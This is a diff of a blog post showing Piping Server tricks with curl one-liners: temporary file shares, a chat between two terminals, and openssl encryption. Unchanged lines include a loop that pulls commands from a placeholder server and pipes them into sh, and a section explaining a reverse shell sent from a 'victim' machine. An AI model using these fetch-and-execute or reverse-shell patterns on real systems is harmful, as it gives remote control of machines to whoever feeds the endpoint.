@@ -14,15 +14,17 @@ image:
 
 Have you ever used [Magic Wormhole](https://magic-wormhole.readthedocs.io/en/latest/welcome.html)? 
 
-I mean, of course you have - but let me just share anyway.
+I mean, of course you have - but let me just say...
 
-Magic Wormhole lets you share things from one computer to another, over WebSockets wrapped in Tor-inspired rendezvous servers. It works great, with firewall **hole** punching, it’s **magic**.
+Magic Wormhole lets you share things from one computer to another, over WebSockets wrapped in Tor-inspired rendezvous servers. It works great, with firewall **hole** punching, it's **magic**.
 
 But what if you didnt want to contact a TURN/relayed/rendezvous server, and you didnt want to install any packages?
 
 **Now we're getting into Piping Server territory.**
 
-What to know the difference between the two? Check out [Magic Wormhole vs Piping Server](#magic-wormhole-vs-piping-server) at the close.
+What to know the difference between the two? 
+
+> Check out my [Magic Wormhole vs Piping Server](#magic-wormhole-vs-piping-server) table at the end of this post.
 
 
 * * *
@@ -31,16 +33,19 @@ What to know the difference between the two? Check out [Magic Wormhole vs Piping
 
 [Piping Server](https://github.com/nwtgck/piping-server) is a hidden gem that provides ephemeral data over HTTP. 
 
-- This allows devices to **share data via `curl` or `wget`** — no installation needed on the client side.
+- This allows devices to **share data** via `curl` or `wget` — no installation needed on the client side.
 
 - Each URL path (e.g., `/myfile`, `/cmd`) acts as a **one-time link**.
 
 This can be leveraged for things like:
 
-* Self-destructing file shares
-* One-time commands
-* Ad-hoc event signaling
-* Ephemeral communication
+- Self-destructing file shares
+
+- One-time commands
+
+- Ad-hoc event signaling
+
+- Ephemeral communication
 
 
 * * *
@@ -179,7 +184,8 @@ while true; do curl -s http://<server>:8080/ican/cmd/anytime | sh; done
 echo "uptime" | curl -s -T - http://<server>:8080/ican/cmd/anytime
 ```
 
-> Great for quick, temporary remote execution. But this command will run forever. How can we fix that? With timeout!
+> Great for quick, temporary remote execution.
+> But this command will run forever. How can we fix that? With `timeout`!
 
 **Remote device only available for 1 hour:**
 
@@ -189,7 +195,7 @@ timeout 1h bash -c 'while true; do curl -s http://<server>:8080/ican/cmd/for-one
 
 * * *
 
-## ⏲ Use `curl` to set a time limit on how long the data is available via the Piping Server
+## ⏲ Use curl to set a time limit on how long the data is available via the Piping Server
 
 Sometimes you want a secret, or a file only being available for so long, and if it isnt retrieved after a specified period, it's no longer offered.
 
@@ -209,10 +215,10 @@ curl -s --max-time 10 -T file.txt <server>:8080/mytempfile
 
 * * *
 
-### 🏗 Combine With `timeout` for Extra Control
+### 🏗 Combine With timeout for Extra Control
 
 ```sh
-timeout 5 curl -s -T file.txt <server>:8080/mytempfile
+timeout 5m curl -s -T file.txt <server>:8080/mytempfile
 ```
 
 Timeout lets you wrap any long-lived curl process (like a polling loop) and stops it automatically.
@@ -223,12 +229,12 @@ Timeout lets you wrap any long-lived curl process (like a polling loop) and stop
 ### 📸 Snapchat Story Style Photo Example
 
 ```sh
-cat secret.jpg | timeout 240 curl -s -T - <server>:8080/hey/download/one-shot.jpg
+cat secret.jpg | timeout 24h curl -s -T - <server>:8080/hey/download/one-shot.jpg
 ```
 
 Tell your friend:
 
-> “Go to [<server>:8080/hey/download/one-shot.jpg](<server>:8080/hey/download/one-shot.jpg) in the next 4 min, or it vanishes.”
+> “Go to [my_server:8080/hey/download/one-shot.jpg](http://my_server:8080/hey/download/one-shot.jpg) in the next 24 hours, or it vanishes.”
 
 No accounts needed.
 
@@ -241,7 +247,7 @@ We can extend Piping with bash!
 
 - `2>&1` will redirect output to our pipe
 
-- `bash -i` tells Bash to run in interactive mode. Without `-i`, Bash assumes it’s running a script or a non-interactive command (e.g., via cron).
+- `bash -i` tells Bash to run in interactive mode. Without `-i`, Bash assumes it's running a script or a non-interactive command (e.g., via cron).
 
 **Victim (sending shell):**
 
@@ -277,13 +283,13 @@ We're going to try and make a bi-directional chat app using single-line shell co
 
 ### 🦜 Terminal A
 
-**Send to B:**
+**Send 🚀 to B:**
 
 ```sh
 while read -r msg; do echo "$msg" | curl -s -T - http://<server>:8080/chat-B; done
 ```
 
-**Receive from B:**
+**Receive 🎁 from B:**
 
 ```sh
 while true; do curl -s http://<server>:8080/chat-A || true; sleep 1; done
@@ -294,13 +300,13 @@ while true; do curl -s http://<server>:8080/chat-A || true; sleep 1; done
 
 ### 🦆 Terminal B
 
-**Send to A:**
+**Send 🚀 to A:**
 
 ```sh
 while read -r msg; do echo "$msg" | curl -s -T - http://<server>:8080/chat-A; done
 ```
 
-**Receive from A:**
+**Receive 🎁 from A:**
 
 ```sh
 while true; do curl -s http://<server>:8080/chat-B || true; sleep 1; done
@@ -333,20 +339,20 @@ while true; do curl -s http://<server>:8080/chat-B || true; sleep 1; done
 
 ##### Computer 1:
 
-- while true for chat-B (in top pane)
+- while read for chat-A (in top pane)
 
-- while read for chat-A (in bottom pane)
+- while true for chat-B (in bottom pane)
 
 
 ##### Computer 2:
 
-- while true for chat-A (in top pane)
+- while read for chat-B (in top pane)
 
-- while read for chat-B (in bottom pane)
+- while true for chat-A (in bottom pane)
 
 > These are **one-line** commands, copy/paste friendly, and work in most POSIX-compatible shells, Termux on Android works fine.
 
-> Each message is one-shot — so don’t reuse the same `/chat-*` endpoints for multiple simultaneous conversations.
+> Each message is one-shot — so don't reuse the same `/chat-*` endpoints for multiple simultaneous conversations.
 
 
 
@@ -359,7 +365,7 @@ Brilliant! But everything up to this point has been plain text. Just our informa
 
 So let's use simple end-to-end encryption with a shared passphrase to fix this.
 
-We’ll use:
+We'll use:
 
 - `openssl enc -aes-256-cbc -pbkdf2` for symmetric encryption.
 
